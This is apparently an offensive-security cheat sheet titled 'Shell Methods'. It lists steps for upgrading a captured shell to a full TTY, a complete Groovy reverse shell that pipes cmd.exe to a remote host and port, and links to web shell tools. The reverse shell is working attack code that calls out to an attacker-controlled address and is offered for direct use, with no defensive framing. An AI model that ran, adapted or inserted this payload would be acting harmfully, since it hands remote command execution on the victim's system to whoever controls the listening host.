# Shell Methods

## TTY Upgrade
### Magic
1. `python -c 'import pty; pty.spawn("/bin/bash")'`
    - alternative: `script -q /dev/null /bin/bash`
2. `Ctrl-Z` # background shell
3. `echo $TERM`
4. `stty -a` # grab rows and columns
5. `stty raw -echo`
6. `fg` # foreground
7. `reset`
8. `export SHELL=bash`
9. `export TERM=xterm-256color`
10. `stty rows $rows columns $cols`

## FwdSh3ll

## Groovy Script Reverse Shell

```
* `String host="10.10.14.9";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket
s=new Socket(host,port);InputStream
pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`
```

Source: https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

## Tools
- https://github.com/SecurityRiskAdvisors/cmd.jsp
- https://github.com/gellin/bantam
- https://github.com/antonioCoco/SharPyShell